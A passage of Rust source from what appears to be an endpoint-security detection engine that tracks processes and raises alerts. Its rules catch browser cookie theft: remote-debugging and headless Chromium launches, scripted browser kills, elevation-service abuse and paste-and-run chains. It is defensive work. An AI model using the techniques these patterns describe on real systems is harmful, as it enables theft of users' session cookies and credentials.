        self.sigma = rules;
    }

    pub fn update_policy(&mut self, p: Policy) {
        let drive = self.system_drive;
        self.exclusions = p.exclusions.iter().map(|x| Excl::new(x, drive)).collect();
        self.iocs = Iocs::build(&p.iocs);
        self.exfil_hosts = p
            .exfil_domains
            .iter()
            .map(|d| entry_host(d))
            .filter(|h| !h.is_empty())
            .collect();
        if !p.canaries {
            if let Ok(mut c) = self.canaries.lock() {
                *c = CanaryState::default();
            }
        }
        self.policy = p;
    }

    pub fn update_rules(&mut self, b: RuleBundle) -> Result<(), DetectError> {
        let rules = sigma::compile_bundle(&b.rules)?;
        self.set_sigma(rules);
        Ok(())
    }

    pub fn table(&self) -> &ProcessTable {
        &self.table
    }

    pub fn seed_process(&mut self, mut info: ProcessInfo) {
        if !info.image.is_empty() {
            // Recompute: the platform's classification may predate volume awareness.
            info.path_class = path_class_of(&info.image, self.system_drive);
        }
        self.note_agent(&info);
        let ts = info.start_ts;
        self.table.insert(info.clone());
        // Known-bad processes already running at agent start: report on the next call.
        let ev = Event {
            ts,
            pid: info.pid,
            guid: info.guid.clone(),
            data: EventData::ProcessStart(ProcessStart {
                ppid: info.ppid,
                parent_guid: info.parent_guid.clone(),
                image: info.image.clone(),
                cmdline: info.cmdline.clone(),
                user: info.user.clone(),
                integrity: info.integrity,
                session_id: 0,
                signer: info.signer.clone(),
                signed: info.signed,
                sha256: info.sha256.clone(),
                motw_zone: info.motw_zone,
                file_size: info.file_size,
            }),
        };
        self.check_process_iocs(&ev, &info);
    }

    /// See [`crate::Engine::enrich_process`].
    pub fn enrich_process(
        &mut self,
        guid: &ProcessGuid,
        facts: crate::ProcessFacts,
        now: TimestampMs,
    ) -> Vec<Output> {
        let Some(cur) = self.table.get(guid).cloned() else {
            return vec![];
        };
        let mut info = cur.clone();
        let mut hash_changed = false;
        let mut sig_changed = false;
        if info.sha256.is_none() {
            if let Some(h) = facts.sha256.filter(|h| !h.trim().is_empty()) {
                info.sha256 = Some(h);
                hash_changed = true;
            }
        }
        let upgrade =
            info.signed == SignatureState::Unknown && facts.signed != SignatureState::Unknown;
        // A revoked certificate demotes a previously valid signature.
        let revoked =
            info.signed == SignatureState::Valid && facts.signed == SignatureState::Invalid;
        if upgrade || revoked {
            info.signed = facts.signed;
            if facts.signer.is_some() {
                info.signer = facts.signer;
            }
            sig_changed = true;
        }
        if !hash_changed && !sig_changed {
            return vec![];
        }
        if let Some(p) = self.table.get_mut(guid) {
            p.sha256 = info.sha256.clone();
            p.signed = info.signed;
            p.signer = info.signer.clone();
        }
        if self.is_agent_guid(guid) {
            return vec![];
        }
        let ev = Event {
            ts: now.max(info.start_ts),
            pid: info.pid,
            guid: info.guid.clone(),
            data: EventData::ProcessStart(ProcessStart {
                ppid: info.ppid,
                parent_guid: info.parent_guid.clone(),
                image: info.image.clone(),
                cmdline: info.cmdline.clone(),
                user: info.user.clone(),
                integrity: info.integrity,
                session_id: 0,
                signer: info.signer.clone(),
                signed: info.signed,
                sha256: info.sha256.clone(),
                motw_zone: info.motw_zone,
                file_size: info.file_size,
            }),
        };
        // Hash / certificate IOCs (dedup per indicator keeps this idempotent).
        self.check_process_iocs(&ev, &info);
        if sig_changed {
            let parent = self.table.parent_of(&info).cloned();
            self.check_st12(&ev, &info, parent.as_ref());
            self.check_st08b(&ev, &info);
            // Re-judge open suspend windows of this process.
            let kill = untrusted_sig(info.signed) && info.path_class.is_user_writable();
            for w in self.suspends.iter_mut().filter(|w| &w.guid == guid) {
                w.kill_at_expiry = w.kill_capable && kill;
            }
        }
        if hash_changed {
            for w in self.suspends.iter_mut().filter(|w| &w.guid == guid) {
                w.sha256 = info.sha256.clone();
            }
        }
        std::mem::take(&mut self.out)
    }

    pub fn canaries(&self, profile: &str) -> Vec<CanarySpec> {
        if !self.policy.canaries {
            return vec![];
        }
        let specs = canary::canary_specs(&self.host.hostname, profile);
        if let Ok(mut c) = self.canaries.lock() {
            for p in canary::immediate_arm_prefixes(&specs) {
                if !c.armed.contains(&p) {
                    c.armed.push(p);
                }
            }
            for s in specs.iter().filter(|s| is_conditional_canary(&s.path)) {
                let d = driveless(&s.path);
                if !c.conditional.contains(&d) && !c.armed.contains(&d) {
                    c.conditional.push(d);
                }
            }
        }
        specs
    }

    pub fn arm_canary(&mut self, path: &str) {
        let d = driveless(path);
        if let Ok(mut c) = self.canaries.lock() {
            c.conditional.retain(|x| x != &d);
            if !c.armed.contains(&d) {
                c.armed.push(d);
            }
        }
    }

    pub fn disarm_canary(&mut self, path: &str) {
        let d = driveless(path);
        if let Ok(mut c) = self.canaries.lock() {
            c.armed.retain(|x| x != &d);
        }
    }

    pub fn armed_canaries(&self) -> Vec<String> {
        self.canaries
            .lock()
            .map(|c| c.armed.clone())
            .unwrap_or_default()
    }

    // ------------------------------------------------------------------
    // helpers
    // ------------------------------------------------------------------

    fn note_agent(&mut self, info: &ProcessInfo) {
        if !self.agent_image.is_empty()
            && !info.image.is_empty()
            && driveless(&info.image) == self.agent_image
        {
            self.agent_guids.insert(info.guid.clone());
        }
    }

    fn is_agent_guid(&self, g: &ProcessGuid) -> bool {
        self.agent_guids.contains(g)
    }

    // ---- read-only accessors for rule families (`families::Ctx`) ----

    pub(crate) fn rule_mode(&self, rule: &str) -> RuleMode {
        self.mode(rule)
    }

    pub(crate) fn is_protected(&self, p: &ProcessInfo) -> bool {
        self.protected(p)
    }

    pub(crate) fn is_agent_process(&self, p: &ProcessInfo) -> bool {
        self.is_agent_guid(&p.guid)
            || (!self.agent_image.is_empty()
                && !p.image.is_empty()
                && driveless(&p.image) == self.agent_image)
    }

    pub(crate) fn system_drive(&self) -> char {
        self.system_drive
    }

    // ---- rule families ----

    /// Run `f` on every family with a read-only context, then emit the hits.
    /// Alerts emitted meanwhile (by ST/TP rules or the hits) are offered to
    /// every family's `on_alert` once; hits from `on_alert` do not cascade.
    fn run_families(
        &mut self,
        ev: &Event,
        now: TimestampMs,
        f: impl Fn(&mut dyn Family, &Ctx, &mut Vec<FamilyHit>),
        alerts_from: usize,
    ) {
        let mut fams = std::mem::take(&mut self.families);
        let mut hits = Vec::new();
        {
            let ctx = Ctx { st: self, now };
            for fam in fams.iter_mut() {
                f(fam.as_mut(), &ctx, &mut hits);
            }
        }
        for h in hits {
            self.emit_family(ev, h);
        }
        let alerts: Vec<Alert> = self.out[alerts_from.min(self.out.len())..]
            .iter()
            .filter_map(|o| match o {
                Output::Alert(d) => Some(d.alert.clone()),
                _ => None,
            })
            .collect();
        if !alerts.is_empty() {
            let mut hits = Vec::new();
            {
                let ctx = Ctx { st: self, now };
                for a in &alerts {
                    for fam in fams.iter_mut() {
                        fam.on_alert(&ctx, a, &mut hits);
                    }
                }
            }
            for h in hits {
                self.emit_family(ev, h);
            }
        }
        // A family may have been added meanwhile only by `families::all()`.
        self.families = fams;
    }

    fn emit_family(&mut self, ev: &Event, h: FamilyHit) {
        let mut hit = Hit::new(h.rule, &h.guid, h.severity, h.summary);
        hit.actions = h.actions;
        hit.suspend = h.suspend;
        hit.kill_at_expiry = h.kill_at_expiry;
        hit.strong |= h.strong;
        hit.extra_evidence = h.extra_evidence;
        hit.dedup_key = h.dedup_key;
        hit.process = h.process;
        if h.audit_only {
            hit.mode_override = Some(RuleMode::Audit);
        }
        self.emit(ev, hit);
    }

    fn proc_info(&self, e: &Event) -> ProcessInfo {
        self.table
            .get(&e.guid)
            .cloned()
            .unwrap_or_else(|| placeholder(&e.guid, e.pid, e.ts))
    }

    fn state(&mut self, g: &ProcessGuid, ts: TimestampMs) -> &mut ProcState {
        if !self.states.contains_key(g) {
            self.states.insert(g.clone(), ProcState::default());
        }
        let s = self.states.get_mut(g).expect("inserted");
        s.last_activity = s.last_activity.max(ts);
        s
    }

    fn mode(&self, rule: &str) -> RuleMode {
        if let Some(m) = self.policy.rules.get(rule) {
            return *m;
        }
        if let Some(m) = builtin_meta().get(rule) {
            return m.default_mode;
        }
        if let Some(r) = self.sigma.iter().find(|r| r.meta.id == rule) {
            return r.meta.default_mode;
        }
        RuleMode::Audit
    }

    /// Exclusions never apply to tamper rules (TP-*): an exclusion must not
    /// be able to silence self-protection.
    fn excluded(&self, p: &ProcessInfo, rule: &str, now: TimestampMs) -> bool {
        if rule.to_ascii_uppercase().starts_with("TP-") {
            return false;
        }
        self.exclusions
            .iter()
            .any(|x| x.matches(p, rule, now, self.system_drive))
    }

    /// Never kill / suspend these: PID 0/4, the agent, and critical OS
    /// processes / Microsoft security products at their exact location on the
    /// system volume with a valid Microsoft signature ([`protect`]). Name or
    /// folder alone never protects; `Unknown` signatures never do.
    fn protected(&self, p: &ProcessInfo) -> bool {
        if p.pid == 0 || p.pid == 4 || self.is_agent_guid(&p.guid) {
            return true;
        }
        protect::is_protected_process(&p.image, p.signed, p.signer.as_deref(), self.system_drive)
    }

    /// Trusted Windows binary: System/Windows dir on the system volume, a
    /// **valid Microsoft** signature, not a LOLBin.
    pub(crate) fn system_trusted(p: &ProcessInfo) -> bool {
        matches!(p.path_class, PathClass::System | PathClass::Windows)
            && protect::microsoft_signed(p.signed, p.signer.as_deref())
            && !is_lolbin(&file_name_lower(&p.image))
    }

    /// Untrusted actor for ST-07: unsigned/invalid, Temp/Downloads/external,
    /// user-writable without a valid signature, or a LOLBin / script host.
    pub(crate) fn untrusted_actor(p: &ProcessInfo) -> bool {
        if p.image.is_empty() {
            return true;
        }
        is_untrusted_location_or_signature(p)
            || (p.path_class == PathClass::UserWritable && p.signed != SignatureState::Valid)
            || (p.path_class == PathClass::Other && p.signed != SignatureState::Valid)
            || is_lolbin(&file_name_lower(&p.image))
    }

    fn is_benign_av(p: &ProcessInfo) -> bool {
        let name = file_name_lower(&p.image);
        !is_untrusted_location_or_signature(p)
            && crate::paths::BENIGN_READERS.iter().any(|r| {
                matches!(
                    r.kind,
                    crate::paths::BenignKind::Security | crate::paths::BenignKind::Indexer
                ) && glob_match(r.image, &name)
                    && match (r.signer, p.signer.as_deref()) {
                        (Some(req), Some(have)) => have.to_ascii_lowercase().contains(req),
                        _ => true,
                    }
            })
    }

    fn related_windows(&self, guid: &ProcessGuid) -> Vec<usize> {
        let parent = self
            .table
            .get(guid)
            .and_then(|p| self.table.parent_of(p))
            .map(|p| p.guid.clone());
        self.suspends
            .iter()
            .enumerate()
            .filter(|(_, w)| {
                &w.guid == guid
                    || parent.as_ref() == Some(&w.guid)
                    || self
                        .table
                        .get(&w.guid)
                        .and_then(|wp| self.table.parent_of(wp))
                        .is_some_and(|wp| &wp.guid == guid)
            })
            .map(|(i, _)| i)
            .collect()
    }

    fn filter_actions(&self, actions: Vec<ResponseAction>) -> Vec<ResponseAction> {
        let mut out: Vec<ResponseAction> = Vec::new();
        for a in actions {
            let keep = match &a {
                ResponseAction::KillProcess { pid, guid, .. }
                | ResponseAction::SuspendProcess { pid, guid }
                | ResponseAction::ResumeProcess { pid, guid } => {
                    let p = guid
                        .as_ref()
                        .and_then(|g| self.table.get(g))
                        .or_else(|| self.table.by_pid(*pid));
                    match p {
                        Some(p) => !self.protected(p),
                        None => *pid != 0 && *pid != 4,
                    }
                }
                ResponseAction::QuarantineFile { path, .. } => {
                    !path.is_empty()
                        && path_class_of(path, self.system_drive).is_user_writable()
                        && driveless(path) != self.agent_image
                }
                ResponseAction::BlockDestination { ip, .. } => parse_ip(ip)
                    .is_some_and(|i| !self.server_ips.contains(&i.to_string()) && !i.is_loopback()),
                ResponseAction::BlockImageNetwork { image, .. } => {
                    // Never cut the network of shared OS binaries (svchost,
                    // explorer, …): that would take the whole host offline.
                    !image.is_empty()
                        && driveless(image) != self.agent_image
                        && !matches!(
                            path_class_of(image, self.system_drive),
                            PathClass::System | PathClass::Windows
                        )
                }
                _ => true,
            };
            if keep && !out.contains(&a) {
                out.push(a);
            }
        }
        out
    }

    /// Central emission path (see module docs).
    fn emit(&mut self, ev: &Event, mut hit: Hit) {
        let mode = match hit.mode_override {
            Some(m) => {
                if self.policy.rules.get(&hit.rule) == Some(&RuleMode::Off) {
                    return;
                }
                m
            }
            None => self.mode(&hit.rule),
        };
        if mode == RuleMode::Off {
            return;
        }
        let proc_ = hit
            .process
            .take()
            .or_else(|| self.table.get(&hit.guid).cloned())
            .unwrap_or_else(|| placeholder(&hit.guid, ev.pid, ev.ts));
        let agent_image = !self.agent_image.is_empty()
            && !proc_.image.is_empty()
            && driveless(&proc_.image) == self.agent_image;
        if !hit.tamper
            && (proc_.pid == 0 || proc_.pid == 4 || self.is_agent_guid(&proc_.guid) || agent_image)
        {
            return;
        }
        if !hit.tamper && self.iocs.allowed_process(&proc_) {
            return;
        }
        if self.excluded(&proc_, &hit.rule, ev.ts) {
            return;
        }
        let protect = mode == RuleMode::Protect;
        let related = if hit.strong && protect {
            self.related_windows(&hit.guid)
        } else {
            vec![]
        };
        let dedup_key = hit.dedup_key.clone().unwrap_or_else(|| hit.rule.clone());
        let last = self
            .states
            .get(&hit.guid)
            .and_then(|s| s.last_fired(&dedup_key));
        if last.is_some_and(|t| ev.ts >= t && ev.ts - t < DEDUP_MS) && related.is_empty() {
            // One alert per rule / process / 10 min — but a re-hit in Protect
            // mode that brings *new* response actions (e.g. a new exfil
            // destination after the first kill failed) still executes them.
            if mode == RuleMode::Protect && !hit.actions.is_empty() {
                let actions = self.filter_actions(std::mem::take(&mut hit.actions));
                let fresh: Vec<ResponseAction> = {
                    let st = self.state(&hit.guid, ev.ts);
                    actions
                        .into_iter()
                        .filter(|a| st.ordered.len() < 256 && st.ordered.insert(format!("{a:?}")))
                        .collect()
                };
                for a in fresh {
                    if let ResponseAction::KillProcess { guid: Some(g), .. } = &a {
                        self.state(g, ev.ts).killed = true;
                        self.suspends.retain(|w| &w.guid != g);
                    }
                    self.out.push(Output::Action(a));
                }
            }
            return;
        }

        let mut actions = Vec::new();
        if protect {
            actions = std::mem::take(&mut hit.actions);
            // escalate suspend windows
            let mut idx = related;
            idx.sort_unstable_by(|a, b| b.cmp(a));
            for i in idx {
                let w = self.suspends.remove(i);
                actions.push(ResponseAction::KillProcess {
                    pid: w.pid,
                    guid: Some(w.guid.clone()),
                    tree: true,
                });
                if w.quarantine {
                    actions.push(ResponseAction::QuarantineFile {
                        path: w.image.clone(),
                        sha256: w.sha256.clone(),
                    });
                }
                if let Some((ip, port)) = &hit.escalation_ip {
                    actions.push(ResponseAction::BlockDestination {
                        ip: ip.clone(),
                        port: Some(*port),
                        image: None,
                        ttl_secs: Some(BLOCK_TTL_SECS),
                        ioc_id: None,
                    });
                }
            }
            let killed = self.states.get(&proc_.guid).is_some_and(|s| s.killed);
            if hit.suspend
                && !killed
                && !self.protected(&proc_)
                && !self.suspends.iter().any(|w| w.guid == proc_.guid)
                && proc_.exit_ts.is_none()
            {
                let already_killing = actions.iter().any(|a| matches!(a, ResponseAction::KillProcess { guid: Some(g), .. } if *g == proc_.guid));
                if !already_killing {
                    actions.insert(
                        0,
                        ResponseAction::SuspendProcess {
                            pid: proc_.pid,
                            guid: Some(proc_.guid.clone()),
                        },
                    );
                    self.suspends.push(SuspendWindow {
                        guid: proc_.guid.clone(),
                        pid: proc_.pid,
                        image: proc_.image.clone(),
                        sha256: proc_.sha256.clone(),
                        quarantine: proc_.path_class.is_user_writable(),
                        deadline: ev.ts + self.policy.suspend_window_ms as i64,
                        kill_at_expiry: hit.kill_at_expiry,
                        kill_capable: hit.rule == ST01 || hit.rule == ST03,
                    });
                    hit.summary.push_str(&format!(
                        " — suspended for {:.1} s pending a verdict",
                        self.policy.suspend_window_ms as f64 / 1000.0
                    ));
                }
            } else if hit.kill_at_expiry {
                if let Some(w) = self.suspends.iter_mut().find(|w| w.guid == proc_.guid) {
                    w.kill_at_expiry = true;
                }
            }
            actions = self.filter_actions(actions);
            for a in &actions {
                if let ResponseAction::KillProcess { guid: Some(g), .. } = a {
                    self.state(g, ev.ts).killed = true;
                    self.suspends.retain(|w| &w.guid != g);
                }
            }
            let st = self.state(&hit.guid, ev.ts);
            for a in &actions {
                if st.ordered.len() < 256 {
                    st.ordered.insert(format!("{a:?}"));
                }
            }
        }

        let (name, author, attack) = match builtin_meta().get(hit.rule.as_str()) {
            Some(m) => (m.name.clone(), None, m.attack.clone()),
            None => (
                hit.name
                    .clone()
                    .unwrap_or_else(|| ioc_rule_name(&hit.rule).to_string()),
                hit.author.clone(),
                hit.attack.clone().unwrap_or_default(),
            ),
        };
        let st = self.state(&hit.guid, ev.ts);
        // Family tick hits carry a synthetic trigger (pid 0, empty guid).
        if !(ev.pid == 0 && ev.guid.0.is_empty()) {
            st.add_evidence(ev);
        }
        let mut evidence: Vec<Event> = st.evidence.iter().cloned().collect();
        let data_at_risk = st.data_at_risk.clone();
        st.set_fired(&dedup_key, ev.ts);
        for x in hit.extra_evidence {
            if !evidence.contains(&x) {
                evidence.push(x);
            }
        }
        if evidence.len() > MAX_EVIDENCE {
            evidence.drain(..evidence.len() - MAX_EVIDENCE);
        }
        let alert = Alert {
            id: Uuid::now_v7(),
            ts: ev.ts,
            rule_id: hit.rule.clone(),
            rule_name: name,
            rule_author: author,
            severity: hit.severity,
            attack,
            mode,
            summary: hit.summary,
            ancestry: self.table.ancestry(&proc_.guid, MAX_ANCESTRY),
            process: proc_,
            data_at_risk,
            evidence,
            actions: vec![],
        };
        self.out.push(Output::Alert(Detection { alert, actions }));
    }

    // ------------------------------------------------------------------
    // dispatch
    // ------------------------------------------------------------------

    pub fn process(&mut self, e: &Event) -> Vec<Output> {
        match &e.data {
            EventData::ProcessStart(ps) => self.on_process_start(e, ps),
            EventData::ProcessStop { .. } => self.on_process_stop(e),
            EventData::FileAccess { path, op } => self.on_file(e, path, *op),
            EventData::NetConnect {
                dst_ip,
                dst_port,
                dst_host,
                ..
            } => self.on_net(e, dst_ip, *dst_port, dst_host.as_deref()),
            EventData::DnsQuery { qname, answers } => self.on_dns(e, qname, answers),
            EventData::DpapiUnprotect { description } => self.on_dpapi(e, description),
            EventData::ProcessAccess(t)
            | EventData::RemoteThread(t)
            | EventData::ThreadContext(t)
            | EventData::DebugAttach(t) => self.on_target(e, t),
            EventData::ImageLoad {
                path,
                signer,
                signed,
            } => self.on_image_load(e, path, signer.as_deref(), *signed),
            EventData::RegistrySet {
                key,
                value_name,
                data,
                op,
            } => {
                if *op == RegistryOp::Set {
                    self.on_registry(e, key, value_name, data.as_deref())
                }
            }
            EventData::ScriptBlock { content, .. } => self.on_script(e, content),
            EventData::Tamper { kind, detail } => self.on_tamper(e, *kind, detail),
            // Handled by the rule families only.
            EventData::FileActivity(_)
            | EventData::TaskRegistered(_)
            | EventData::ServiceInstalled(_)
            | EventData::WmiSubscription(_) => {}
        }
        if self.sigma_kinds & kind_bit(e.kind()) != 0 {
            self.eval_sigma(e);
        }
        self.run_families(e, e.ts, |f, ctx, out| f.on_event(ctx, e, out), 0);
        std::mem::take(&mut self.out)
    }

    pub fn tick(&mut self, now: TimestampMs) -> Vec<Output> {
        let mut i = 0;
        while i < self.suspends.len() {
            if self.suspends[i].deadline <= now {
                let w = self.suspends.remove(i);
                if w.kill_at_expiry {
                    self.out.push(Output::Action(ResponseAction::KillProcess {
                        pid: w.pid,
                        guid: Some(w.guid.clone()),
                        tree: true,
                    }));
                    if w.quarantine {
                        self.out
                            .push(Output::Action(ResponseAction::QuarantineFile {
                                path: w.image.clone(),
                                sha256: w.sha256.clone(),
                            }));
                    }
                } else {
                    self.out.push(Output::Action(ResponseAction::ResumeProcess {
                        pid: w.pid,
                        guid: Some(w.guid.clone()),
                    }));
                }
            } else {
                i += 1;
            }
        }
        self.clickfix.retain(|c| c.until > now);
        while self
            .browser_stops
            .front()
            .is_some_and(|(t, _)| now - t > ST08_ATTRIBUTION_MS * 2)
        {
            self.browser_stops.pop_front();
        }
        while self
            .kill_intents
            .front()
            .is_some_and(|(t, _)| now - t > ST08_ATTRIBUTION_MS * 2)
        {
            self.kill_intents.pop_front();
        }
        if now - self.last_evict >= EVICT_INTERVAL_MS {
            self.last_evict = now;
            self.debug_ports.retain(|_, t| now - *t < DEBUG_PORT_TTL_MS);
            for g in self.table.evict(now) {
                self.states.remove(&g);
                self.agent_guids.remove(&g);
                for f in self.families.iter_mut() {
                    f.forget(&g);
                }
            }
            let table = &self.table;
            self.states.retain(|g, s| {
                table.get(g).is_some_and(|p| p.exit_ts.is_none())
                    || now - s.last_activity < STATE_IDLE_MS
            });
            for s in self.states.values_mut() {
                s.fired.retain(|(_, t)| now - *t < DEDUP_MS);
            }
        }
        // Rule families. Tick hits have no triggering event: the subject is
        // looked up in the table (families set `process` for exited ones) and
        // the evidence comes from `extra_evidence`.
        let tick_ev = Event {
            ts: now,
            pid: 0,
            guid: ProcessGuid::default(),
            data: EventData::ProcessStop { exit_code: None },
        };
        let from = self.out.len();
        self.run_families(&tick_ev, now, |f, ctx, out| f.tick(ctx, out), from);
        std::mem::take(&mut self.out)
    }

    // ------------------------------------------------------------------
    // process lifecycle (ST-05, ST-08, ST-10 pending, ST-11, ST-12, ST-13, IOCs)
    // ------------------------------------------------------------------

    fn on_process_start(&mut self, e: &Event, ps: &ProcessStart) {
        let info = ProcessInfo {
            guid: e.guid.clone(),
            pid: e.pid,
            ppid: ps.ppid,
            parent_guid: ps.parent_guid.clone(),
            image: ps.image.clone(),
            cmdline: ps.cmdline.clone(),
            user: ps.user.clone(),
            integrity: ps.integrity,
            start_ts: e.ts,
            exit_ts: None,
            signer: ps.signer.clone(),
            signed: ps.signed,
            sha256: ps.sha256.clone(),
            motw_zone: ps.motw_zone,
            file_size: ps.file_size,
            path_class: path_class_of(&ps.image, self.system_drive),
        };
        self.note_agent(&info);
        self.table.insert(info.clone());
        if self.is_agent_guid(&info.guid) {
            return;
        }
        let name = file_name_lower(&info.image);
        let cmd_lower = info.cmdline.to_ascii_lowercase();
        let parent = self.table.parent_of(&info).cloned();
        let parent_name = parent
            .as_ref()
            .map(|p| file_name_lower(&p.image))
            .unwrap_or_default();
        let chromium = is_chromium_image(&info.image);
        if chromium && !cmd_lower.contains("--type=") {
            self.last_browser_start = e.ts;
        }

        self.check_process_iocs(e, &info);

        // ST-05 browser debugging abuse
        if chromium && !cmd_lower.contains("--type=") {
            if let Some(port) = parse_flag(&cmd_lower, "--remote-debugging-port=")
                .and_then(|p| p.parse::<u16>().ok())
            {
                if port != 0
                    && (self.debug_ports.len() < 64 || self.debug_ports.contains_key(&port))
                {
                    self.debug_ports.insert(port, e.ts);
                }
            }
            let debug = cmd_lower.contains("--remote-debugging-");
            let alt = cmd_lower.contains("--user-data-dir")
                || cmd_lower.contains("--headless")
                || cmd_lower.contains("--window-position=-");
            let load_ext = cmd_lower.contains("--load-extension");
            let port_zero =
                parse_flag(&cmd_lower, "--remote-debugging-port=").is_some_and(|p| p == "0");
            let parent_ok = parent_name == "explorer.exe" || is_browser_image(&parent_name);
            if ((debug && alt && !port_zero) || load_ext) && !parent_ok {
                let what = if load_ext && !debug {
                    "with --load-extension (unpacked extension side-loading)".to_string()
                } else {
                    let mut flags = vec!["remote debugging"];
                    if cmd_lower.contains("--headless") {
                        flags.push("headless");
                    }
                    if cmd_lower.contains("--user-data-dir") {
                        flags.push("an alternate profile directory");
                    }
                    if cmd_lower.contains("--window-position=-") {
                        flags.push("an off-screen window");
                    }
                    format!(
                        "with {}",
                        join_and(&flags.iter().map(|s| s.to_string()).collect::<Vec<_>>())
                    )
                };
                let pdesc = parent
                    .as_ref()
                    .map(describe)
                    .unwrap_or_else(|| format!("process {}", info.ppid));
                let mut hit = Hit::new(ST05, &info.guid, Severity::High, format!("{pdesc} launched {} {what}, a technique used to pull cookies through the DevTools protocol", short_name(&info)));
                hit.actions.push(kill(&info, true));
                if let Some(p) = &parent {
                    if !is_browser_image(&p.image) {
                        hit.actions.push(kill(p, false));
                        if p.path_class.is_user_writable() {
                            hit.actions.push(quarantine(p));
                        }
                    }
                }
                self.state(&info.guid, e.ts).add_evidence(e);
                self.emit(e, hit);
            }
        }

        // ST-08 kill intents (taskkill / Stop-Process / wmic against browsers)
        if matches!(
            name.as_str(),
            "taskkill.exe" | "powershell.exe" | "pwsh.exe" | "wmic.exe" | "cmd.exe"
        ) && (cmd_lower.contains("chrome")
            || cmd_lower.contains("msedge")
            || cmd_lower.contains("brave"))
            && (cmd_lower.contains("taskkill")
                || cmd_lower.contains("stop-process")
                || cmd_lower.contains("kill")
                || cmd_lower.contains("terminate"))
        {
            // Attribute to the process that ran the kill command (unless it is a shell host we never kill).
            let actor = parent
                .as_ref()
                .filter(|p| !is_browser_image(&p.image) && !self.protected(p))
                .map(|p| p.guid.clone());
            self.kill_intents
                .push_back((e.ts, actor.unwrap_or_else(|| info.guid.clone())));
            if self.kill_intents.len() > 256 {
                self.kill_intents.pop_front();
            }
        }

        // ST-08 elevation service abuse
        if name == "elevation_service.exe" {
            self.check_elevation_abuse(e, &info);
        }
        // ST-08 (b) unsigned image executing from a browser Application directory
        self.check_st08b(e, &info);

        // ST-10 pending ClickFix kills (RunMRU written before this child appeared)
        if let Some(pg) = &parent.as_ref().map(|p| p.guid.clone()) {
            let mut kill_now = false;
            for c in &self.clickfix {
                if &c.writer == pg && e.ts <= c.until && c.protect && name.starts_with(c.lolbin) {
                    kill_now = true;
                }
            }
            if kill_now && !self.protected(&info) {
                self.out.push(Output::Action(kill(&info, true)));
            }
        }

        // ST-11 paste-and-run chain
        self.check_paste_and_run(e, &info, parent.as_ref(), &name, &cmd_lower);

        // ST-12 untrusted execution from user paths
        self.check_st12(e, &info, parent.as_ref());

        // ST-13 candidate (.NET LOLBin with no project or unusual parent)
        if DOTNET_LOLBINS.contains(&name.as_str()) {
            let no_args = !has_arguments(&info.cmdline);
            let unusual_parent = parent.as_ref().is_some_and(|p| {
                let pn = file_name_lower(&p.image);
                !DOTNET_EXPECTED_PARENTS.contains(&pn.as_str())
                    && (Self::untrusted_actor(p)
                        || pn == "explorer.exe"
                        || pn.starts_with("winword")
                        || pn.starts_with("excel")
                        || pn == "outlook.exe")
            });
            if no_args || unusual_parent {
                let st = self.state(&info.guid, e.ts);
                st.st13 = Some(if no_args {
                    "without a project or assembly argument"
                } else {
                    "from an unusual parent"
                });
                st.add_evidence(e);
            }
        }

        // IOC URL in command line
        if let Some(h) = self.iocs.by_url_in(&cmd_lower).cloned() {
            self.emit_ioc(
                e,
                &info,
                IOC_URL,
                &h,
                format!(
                    "{} was started with a command line containing the known-bad URL {}",
                    describe(&info),
                    h.value
                ),
                vec![kill(&info, true)],
            );
        }
    }

    /// ST-08 (b): an image without a valid signature executing from a
    /// browser Application directory. `Unknown` is not judged here (a
    /// browser's own binaries would be hit while enrichment is pending); it
    /// is evaluated when the facts arrive ([`EngineState::enrich_process`]).
    fn check_st08b(&mut self, e: &Event, info: &ProcessInfo) {
        if matches!(
            info.signed,
            SignatureState::Unsigned | SignatureState::Invalid
        ) && !info.image.is_empty()
        {
            let dl = driveless(&info.image);
            if BROWSER_APP_DIRS.iter().any(|d| dl.contains(d)) {
                let mut hit = Hit::new(ST08, &info.guid, Severity::High, format!("{} ran from the browser's Application folder without a valid signature — code placed there can ask the browser's elevation service to decrypt cookies", describe(info)));
                hit.actions.push(kill(info, false));
                hit.actions.push(quarantine(info));
                self.state(&info.guid, e.ts).add_evidence(e);
                self.emit(e, hit);
            }
        }
    }

    /// ST-12: unsigned / invalidly signed image started from a user-writable
    /// location. `Unknown` is re-evaluated on late enrichment.
    fn check_st12(&mut self, e: &Event, info: &ProcessInfo, parent: Option<&ProcessInfo>) {
        if matches!(
            info.signed,
            SignatureState::Unsigned | SignatureState::Invalid
        ) && info.path_class.is_user_writable()
        {
            let mut sev = Severity::Low;
            let mut extra = Vec::new();
            if info.motw_zone == Some(3) {
                sev = Severity::Medium;
            }
            if info.file_size.is_some_and(|s| s > LARGE_IMAGE_BYTES) {
                sev = if sev == Severity::Medium {
                    Severity::High
                } else {
                    Severity::Medium
                };
                extra.push(format!(
                    "{} MB, likely padded to evade scanning",
                    info.file_size.unwrap_or(0) / (1024 * 1024)
                ));
            }
            let mut summary = format!("{} started", describe(info));
            if let Some(p) = parent {
                summary.push_str(&format!(" from {}", short_name(p)));
            }
            if !extra.is_empty() {
                summary.push_str(&format!(" ({})", extra.join(", ")));
            }
            let mut hit = Hit::new(ST12, &info.guid, sev, summary);
            hit.suspend = true;
            self.state(&info.guid, e.ts).add_evidence(e);
            self.emit(e, hit);
        }
    }

    fn check_process_iocs(&mut self, e: &Event, info: &ProcessInfo) {
        if let Some(h) = self.iocs.by_hash(info).cloned() {
            if h.action != IocAction::Allow {
                let s = format!(
                    "{} matches known-bad file hash {}{}",
                    describe(info),
                    truncate(&h.value, 16),
                    if h.description.is_empty() {
                        String::new()
                    } else {
                        format!(" ({})", h.description)
                    }
                );
                self.emit_ioc(
                    e,
                    info,
                    IOC_HASH,
                    &h,
                    s,
                    vec![kill(info, true), quarantine(info)],
                );
            }
        }
        if let Some(h) = self.iocs.by_cert(info).cloned() {
            if h.action != IocAction::Allow {
                let s = format!(
                    "{} is signed by blocked certificate \"{}\"",
                    describe(info),
                    info.signer.clone().unwrap_or_default()
                );
                self.emit_ioc(
                    e,
                    info,
                    IOC_CERT,
                    &h,
                    s,
                    vec![kill(info, true), quarantine(info)],
                );
            }
        }
    }

    fn emit_ioc(
        &mut self,
        e: &Event,
        info: &ProcessInfo,
        rule: &str,
        h: &IocHit,
        summary: String,
        actions: Vec<ResponseAction>,
    ) {
        let mut hit = Hit::new(
            rule,
            &info.guid,
            if h.action == IocAction::Block {
                Severity::High
            } else {
                Severity::Medium
            },
            summary,
        );
        hit.mode_override = Some(if h.action == IocAction::Block {
            RuleMode::Protect
        } else {
            RuleMode::Audit
        });
        hit.actions = actions;
        hit.process = Some(info.clone());
